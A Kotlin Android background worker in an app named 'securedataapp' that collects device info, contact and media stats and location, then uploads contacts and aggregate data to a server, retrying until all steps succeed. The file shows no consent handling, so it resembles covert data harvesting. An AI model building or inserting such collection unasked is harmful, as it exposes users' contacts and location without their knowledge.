package com.yurap.securedataapp

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters

class SyncWorker(appContext: Context, params: WorkerParameters) : CoroutineWorker(appContext, params) {
    override suspend fun doWork(): Result {
        val repo = Repository(applicationContext)
        val a = repo.collectDeviceInfo()
        val b = repo.collectContactsCount()
        val c = repo.collectMediaStats()
        val d = repo.collectLocation()
        val e = repo.syncAggregateToServer()
        val f = repo.uploadContactsToServer()
        return if (a && b && c && d && e && f) Result.success() else Result.retry()
    }
}
